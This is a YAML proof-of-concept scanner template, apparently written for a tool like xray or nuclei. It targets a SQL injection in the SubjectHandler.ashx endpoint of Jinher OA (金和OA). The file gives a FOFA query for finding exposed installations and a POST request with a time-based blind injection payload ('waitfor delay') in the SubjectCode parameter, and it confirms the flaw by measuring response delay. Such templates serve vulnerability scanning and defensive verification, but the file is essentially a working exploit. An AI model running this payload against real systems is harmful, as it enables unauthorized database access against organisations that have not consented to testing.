id: poc-yaml-jinher-jhsoft-subjecthandler-ashx-sqli
info:
  name: 金和OA SubjectHandler.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: POST
  path: /c6/JHSoft.Web.CostControl/subClass/Handlers/SubjectHandler.ashx?SubjectCode=1'waitfor+delay%270:0:{{.t1}}%27--&Action=updateactive
  expression: 'status_code == 200 &&

    body == `{"result":false}` &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
